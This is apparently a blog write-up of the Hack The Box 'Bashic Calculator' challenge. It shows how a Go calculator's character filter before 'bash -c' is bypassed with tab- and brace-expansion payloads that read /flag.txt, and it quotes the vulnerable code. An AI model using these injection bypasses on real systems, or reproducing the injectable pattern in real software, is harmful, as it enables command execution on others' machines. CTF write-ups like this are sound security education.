---
title: Hack The Box - Bashic Calculator pwned!
date: 2023-01-28 00:00:01 +0000
categories: [hack the box, challenge]
tags: [hack the box, challenge, bashic calculator]
img_path: /assets/img/posts/
---

## Description

> I've made the coolest calculator. It's pretty simple, I don't need to parse the input and take care of execution order, bash does it for me!I've also made sure to remove characters like $ or ` to not allow code execution, that will surely be enough.

## Analysis

When whe extract the `Bashic calculator.zip` file, we find the directory `misc_bashic_calculator`, which is a docker image.
The calculator source code is in `/src/main.go`.
In the source code, we can see a few interesting things:

### Firewall

```go
firewall := []string{" ", "`", "$", "&", "|", ";", ">"}
        for _, v := range firewall {
                opL1 := len(op)
                op = strings.ReplaceAll(op, v, "")
                opL2 := len(op)
                if opL1 > opL2 {
                        conn.Write([]byte(strconv.Itoa(opL1-opL2) + "   '" + v + "' removed\n"))
                }
        }
```

Here, we can see how string sanitization is done.
We can see that the following characters will be removed from our input: " ", "`", "$", "&", "|", ";", ">".
Ok, this complicates our task, but still let us use some interesting chars as ">", "(", ")", "{", "}", "[", "]", "\", "#" and tabs.

### Command construction

```go
command := "echo $((" + op + "))"
```

Here, we can see that our input will be converted to `echo $((*input*))`.
It's logic, since this program is a calculator and `$((...))` is an arithmetic expression in bash.

### Command execution

```go
func (_ LocalShell) Execute(ctx context.Context, cmd string) ([]byte, error) {                                                                                                                               
      wrapperCmd := exec.CommandContext(ctx, "bash", "-c", cmd)                                                                                                                                                
      return wrapperCmd.Output()                                                                                                                                                                               
 }
 ```

Here, we can see that the execution of our input will be `bash -c $((*input*))`

## Solutions

### Way 1: Compound commands

`cat    /flag.txt)  )	#`

>Since we can't use spaces by the "firewall", we will use tabs.
{: .prompt-info}

If we introduce this input we will be able to escape the bash arithmetic expression evaluation.  
Our expression will be executed as `bash -c $((cat /flag.txt) ) #))`.  
As `#` convert what follows in a commentary the executed expression will be: `bash -c $((cat /flag.txt) )`.  

How works `bash -c $((cat /flag.txt) )`?

* `bash -c` starts a new instance of the bash shell  
* bash begins to evaluate the `$((cat /flag.txt) )` expression  
* `(cat /flag.txt)` will be executed on a subshell environment and it will return the result.

[Man bash/Compound commands](https://manpages.org/bash): 
 
### Way 2: Compound commands and brace expansion

`{cat,flag.txt}) ) #`

We will be able to scape the bash arithmentic expression evaluation in a similar way to the previous, when we used compound commands.
But, now, we will add {}. 
{} are used to generate arbitrary strings. 
The pattern to be expanded is contained between {} and an be a list of comma separated strings (without any space between them).
Finally, the expansion will be done from left to right.

```
$ {echo,1,2,3}
1 2 3
```

Our expression `{cat,/flag.txt}) ) #` will be executed as `bash -c $(({cat,flag.txt}) ) #))
As `#` convert what follows in a commentary the executed expression will be: `bash -c $(({cat,flag.txt}) )`.

How works `bash -c $(({cat,flag.txt}) )`?

* `bash -c` starts a new instance of the bash shell  
* Before the Bash shell executes a command any expansion is performed. The executed expression will be `bash -c $((cat flag.txt) )`
* `(cat /flag.txt)` will be executed on a subshell environment and it will return the result.

[Brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html)   

![Challenge results](htb-bashic-calculator-owned.png){: width="700" height="600" .shadow}
_Bashic Calculator has been Pwned_

_Enjoy! ;)_
